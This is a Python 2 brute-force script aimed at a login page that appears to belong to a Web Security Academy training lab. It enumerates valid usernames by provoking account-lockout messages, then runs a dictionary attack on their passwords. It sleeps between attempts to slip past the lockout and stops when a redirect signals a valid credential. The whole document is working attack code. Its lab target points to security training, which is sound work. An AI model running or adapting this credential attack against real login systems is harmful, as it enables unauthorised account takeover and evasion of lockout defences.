import requests
import time
import sys

url = 'https://aca01f951e8eb562803daf4a00790046.web-security-academy.net/login'
usernames = []
passwords = []

validUser = raw_input('[+] Please enter valid username (or) Press enter to brute-force valid usernames\n')

f = open("usernames.txt","r")
for x in f:
	usernames.append(x.strip())

f.close()

# print usernames

f = open("passwords.txt", "r")
for x in f:
	passwords.append(x.strip())

f.close()

validUserNames = []

password = "test"

if not validUser:
	for username in usernames:
		for count in range(0,5):
	
			myData = {'username':username,'password':password,'count': count}

			x = requests.post(url, data=myData)
			print username + ":" + password + " ==> " + "Status Code: " + str(x.status_code) + " Reason: " + x.reason

			if x.status_code >= 500:
				print "The server gave a 500 error."
				sys.exit()
			else:
				if 'minute' in x.text:
					print "Found valid username " + username
					validUserNames.append(username)
					break
	
				if 'Invalid username or password' in x.text:
					print username + ":" + password + " ==> " + " Response: The username or password was incorrect"

#		time.sleep(0.001)

	print "[+] Valid Usernames: " + str(validUserNames)

print "[+] Starting dictionary attack on valid username"

validCredentials = []

count = 1

if validUser != '':
	validUserNames.append(validUser)

# Go through all the valid usernames, that was brute-forced in the previous step.
for validUser in validUserNames:
	for password in passwords:
		myData = {'username':validUser,'password':password}
		
		x = requests.post(url, data=myData)
		print validUser + ":" + password + " ==> " + "Status Code: " + str(x.status_code) + " Reason: " + x.reason

		# The server gave a gateway timeout. Exit and refresh the session, manually.
		if x.status_code >= 500:
			print "The server gave a 500 error."
			sys.exit()
		
		# This signifies, that the account is locked out. Wait for a minute, before trying next.
		elif 'minute' in x.text:
			print 'Account is locked out!'
			count=1
			time.sleep(60)
			
		elif x.status_code == 302:
			print "Found a valid credential! : " + validUser + ":" + password
			validCredentials.append([validUser, password])
			break

		count=count+1

		if count > 3:
			count=1
			print('sleeping')
			time.sleep(60)
			#break
		
		if len(validCredentials) > 0:
			sys.exit()		
		
			
			
			
		

